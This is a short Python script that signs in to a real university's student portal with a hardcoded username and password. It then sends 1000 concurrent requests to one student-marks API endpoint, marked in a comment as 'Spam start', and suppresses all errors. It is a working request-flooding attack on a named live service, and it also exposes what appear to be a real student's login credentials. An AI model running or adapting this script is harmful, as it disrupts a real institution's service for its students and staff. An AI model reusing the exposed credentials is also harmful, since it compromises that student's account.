import requests
from concurrent.futures import ThreadPoolExecutor

urlLogin = "https://sinhvien1.tlu.edu.vn:8098/education/oauth/token"

dataRequestLogin = {
    "client_id": "education_client",
    "grant_type": "password",
    "username": "2151183845",
    "password": "001303037558",
    "client_secret": "password"
}

try:
    response = requests.post(urlLogin, data=dataRequestLogin)
    response.raise_for_status()  # Raise an HTTPError for bad responses

    access_token = response.json().get("access_token")
    print(f"Access Token: {access_token}")

    # Spam start
    url = "https://sinhvien1.tlu.edu.vn:8098/education/api/studentsubjectmark/checkFinishedEducationProgramOfStudent/tree/studentId/127"
    headers = {
        "Authorization": "Bearer " + access_token
    }

    # Function to make a single request
    def make_request(_):
        print("aaa")
        try:
            requests.get(url, headers=headers, timeout=2)  # Set a timeout if needed 2s
        except requests.exceptions.RequestException as e:
            # Log the exception or do nothing to ignore the error
            pass

    # Number of parallel requests
    num_requests = 1000

    # Set max_workers to a higher value
    max_workers = 6500

    # Use ThreadPoolExecutor to make asynchronous requests
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Use submit instead of map to fire off asynchronous requests
        futures = [executor.submit(make_request, _) for _ in range(num_requests)]

    # Wait for all threads to complete (optional)
    for future in futures:
        future.result()

    print("All requests submitted")

except requests.exceptions.RequestException as e:
    # Handle the exception or do nothing to ignore it
    pass